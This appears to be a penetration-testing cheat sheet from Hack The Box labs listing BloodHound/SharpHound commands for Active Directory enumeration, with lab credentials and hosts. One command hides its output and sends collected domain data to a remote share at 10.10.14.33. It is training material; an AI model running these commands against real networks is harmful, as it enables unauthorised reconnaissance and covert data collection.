



# BloodHound

| Command                                                                                                                              | Description                                      |
| ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------ |
| `.\SharpHound.exe -c all --zipfilename inlanefreight_bloodhound`                                                                     | Run the SharpHound C# ingestor                   |
| `.\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames`   | Randomize and hide SharpHound Output             |
| `Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound`                                                          | Run the SharpHound PowerShell ingestor           |
| `bloodhound-python -dc <DC> -gc <GC> -d <DOMAIN -c All -u <user>`                                                                    | Run bloodhound-python                            |
| `bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -dc dc01.vintage.htb`                                          |                                                  |
| `bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 -k`                                 |                                                  |
| `bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 --kerberos`                         | Using BloodHound.py with Kerberos authentication |
| `runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe`<br>`net view \\inlanefreight.htb\`<br>`SharpHound.exe -d inlanefreight.htb` | Running from Non-Domain-Joined Systems           |
